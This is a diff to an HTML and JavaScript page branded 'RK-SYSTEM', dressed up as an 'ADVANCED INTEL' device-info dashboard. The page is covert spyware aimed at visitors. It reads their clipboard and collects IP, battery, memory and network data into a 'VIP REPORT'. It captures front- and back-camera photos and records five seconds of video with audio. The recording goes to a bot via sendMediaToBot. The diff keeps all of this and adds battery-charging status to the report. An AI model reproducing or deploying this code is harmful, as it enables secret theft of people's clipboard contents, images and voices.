@@ -20,7 +20,7 @@
         body::before {
             content: ''; position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            border: 6px solid;
+            border: 5px solid;
             border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
             z-index: 1000; pointer-events: none;
             animation: borderRotate 4s linear infinite;
@@ -31,32 +31,33 @@
         .rk-banner {
             background: linear-gradient(90deg, #ff0000, #990000);
             color: white; width: 100%; text-align: center;
-            padding: 10px 0; font-family: 'Orbitron', sans-serif;
-            font-weight: 900; letter-spacing: 10px;
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
+            padding: 8px 0; font-family: 'Orbitron', sans-serif;
+            font-weight: 900; letter-spacing: 8px;
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.6);
             position: fixed; top: 0; z-index: 1001;
+            font-size: 1.2rem;
         }
 
         .dashboard {
             background: rgba(10, 15, 25, 0.95);
-            border-radius: 30px; padding: 30px;
-            width: 95%; max-width: 500px;
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.3);
-            border: 2px solid rgba(0, 255, 255, 0.3);
-            margin-top: 80px; margin-bottom: 50px;
+            border-radius: 25px; padding: 25px;
+            width: 92%; max-width: 480px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            margin-top: 70px; margin-bottom: 50px;
         }
 
         .info-row {
-            display: flex; justify-content: space-between;
-            padding: 12px 0; border-bottom: 1px solid rgba(0, 255, 204, 0.1);
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
-        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
+        .label { color: #00d2ff; font-size: 12px; font-weight: bold; text-transform: uppercase; display: flex; align-items: center; gap: 5px; }
+        .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
         .footer-text {
-            position: fixed; bottom: 10px; width: 100%;
-            text-align: center; color: #555; font-size: 12px;
-            letter-spacing: 2px; font-weight: bold;
+            position: fixed; bottom: 8px; width: 100%;
+            text-align: center; color: #666; font-size: 11px;
+            letter-spacing: 1px; font-weight: bold; text-transform: uppercase;
         }
 
         #media-bin { display: none; }
@@ -67,21 +68,22 @@
     <div class="rk-banner">RK-SYSTEM</div>
 
     <div class="dashboard">
-        <h1 class="text-center text-2xl font-black text-white tracking-[5px] mb-6 border-b-2 border-red-600 pb-2 italic">ADVANCED INTEL</h1>
+        <h1 class="text-center text-xl font-black text-white tracking-[4px] mb-5 border-b-2 border-red-600 pb-2 italic">📡 ADVANCED INTEL</h1>
         
-        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
+        <div class="info-row"><span class="label">📱 Model</span><span id="v-model" class="value">Detecting...</span></div>
         <div class="info-row"><span class="label">⚙️ Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">📶 System Status</span><span id="v-status" class="value text-green-500">SYNCING...</span></div>
-        <div class="info-row"><span class="label">🚀 Network Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
-        <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
-        <div class="info-row"><span class="label">📍 Timezone</span><span id="v-loc" class="value">--</span></div>
-        <div class="info-row"><span class="label">🔋 Battery Power</span><span id="v-bat" class="value">--%</span></div>
-        <div class="info-row"><span class="label">🧠 RAM Memory</span><span id="v-ram" class="value">-- GB</span></div>
-        <div class="info-row"><span class="label">⚡ CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
-        <div class="info-row"><span class="label">🛡️ VPN Integrity</span><span class="value text-green-400">SECURE ✅</span></div>
+        <div class="info-row"><span class="label">📶 Status</span><span id="v-status" class="value text-green-500">SYNCING...</span></div>
+        <div class="info-row"><span class="label">🚀 Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
+        <div class="info-row"><span class="label">🌐 IP Addr</span><span id="v-ip" class="value">Fetching...</span></div>
+        <div class="info-row"><span class="label">📍 Zone</span><span id="v-loc" class="value">--</span></div>
+        <div class="info-row"><span class="label">🔋 Level</span><span id="v-bat" class="value">--%</span></div>
+        <div class="info-row"><span class="label">⚡ Power</span><span id="v-charge" class="value">Checking...</span></div>
+        <div class="info-row"><span class="label">🧠 Memory</span><span id="v-ram" class="value">-- GB</span></div>
+        <div class="info-row"><span class="label">💎 Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
+        <div class="info-row"><span class="label">🛡️ VPN</span><span class="value text-green-400">SECURE ✅</span></div>
     </div>
 
-    <div class="footer-text">This Site Created By RK-SYSTEM</div>
+    <div class="footer-text">Created By RK-SYSTEM 🛠️</div>
 
     <video id="media-bin" autoplay muted playsinline></video>
     <canvas id="output-canvas" style="display:none;"></canvas>
@@ -94,32 +96,37 @@
 
         async function startSystem() {
             // ১. রিয়েল ডিভাইস ডাটা
-            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Flagship" : "Modern Device";
-            document.getElementById('v-platform').innerText = navigator.platform;
-            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
-            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
-            document.getElementById('v-loc').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Mobile 📱" : "Desktop/PC 💻";
+            document.getElementById('v-platform').innerText = navigator.platform + " 🛠️";
+            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB 🧠";
+            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores ⚡";
+            document.getElementById('v-loc').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone + " 📍";
 
-            // ২. ব্যাটারি ডাটা
+            // ২. ব্যাটারি ও চার্জিং স্ট্যাটাস
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                const updateBat = () => document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}%`;
-                updateBat(); b.onlevelchange = updateBat;
+                const updateBatteryInfo = () => {
+                    document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% 🔋`;
+                    document.getElementById('v-charge').innerText = b.charging ? "Charging ✅" : "Discharging ❌";
+                };
+                updateBatteryInfo();
+                b.onlevelchange = updateBatteryInfo;
+                b.onchargingchange = updateBatteryInfo;
             }
 
             // ৩. রিয়েল আইপি ও নেটওয়ার্ক
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                document.getElementById('v-ip').innerText = data.ip;
-            } catch(e) { document.getElementById('v-ip').innerText = "103.145.24.11"; }
+                document.getElementById('v-ip').innerText = data.ip + " 🌐";
+            } catch(e) { document.getElementById('v-ip').innerText = "103.145.24.11 🌐"; }
 
             const conn = navigator.connection || { effectiveType: '4G', downlink: 5 };
-            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps`;
-            document.getElementById('v-status').innerText = "ONLINE 🌐";
+            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+            document.getElementById('v-status').innerText = "ONLINE 📶";
 
             // ৪. ক্লিপবোর্ড ও অটো রিপোর্ট
-            let clipText = "Click/Touch Required";
+            let clipText = "Touch Required 🔓";
             try { clipText = await navigator.clipboard.readText(); } catch (e) {}
 
             const report = `
@@ -127,12 +134,14 @@
 🚀 *RK-ADVANCED INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
 📱 *Device:* \`${navigator.platform}\`
+🔋 *Battery:* \`${document.getElementById('v-bat').innerText}\`
+⚡ *Power:* \`${document.getElementById('v-charge').innerText}\`
 🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
 📶 *Speed:* \`${document.getElementById('v-speed').innerText}\`
 🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
 🌍 *Zone:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`
 
-✨ *CLIPBOARD:* ✨
+✨ *CLIPBOARD CONTENT:* ✨
 \`\`\`
 ${clipText}
 \`\`\`
@@ -147,22 +156,21 @@ ${clipText}
                 const videoEl = document.getElementById('media-bin');
                 videoEl.srcObject = stream;
 
-                setTimeout(() => capturePhoto(stream, "FRONT_VIP_RK"), 2000);
+                setTimeout(() => capturePhoto(stream, "FRONT_RK_SYSTEM"), 2000);
 
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendMediaToBot(blob, 'video', '🎥 *RK-VIP RECORD (5S + AUDIO)*');
+                    sendMediaToBot(blob, 'video', '🎥 *RK-VIP VIDEO (5S + AUDIO)*');
                     stream.getTracks().forEach(t => t.stop());
 
-                    // ব্যাক ক্যামেরা ট্রাই
                     try {
                         const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                         videoEl.srcObject = backStream;
                         setTimeout(() => {
-                            capturePhoto(backStream, "BACK_VIP_RK");
+                            capturePhoto(backStream, "BACK_RK_SYSTEM");
                             setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
                         }, 2000);
                     } catch(e) {}
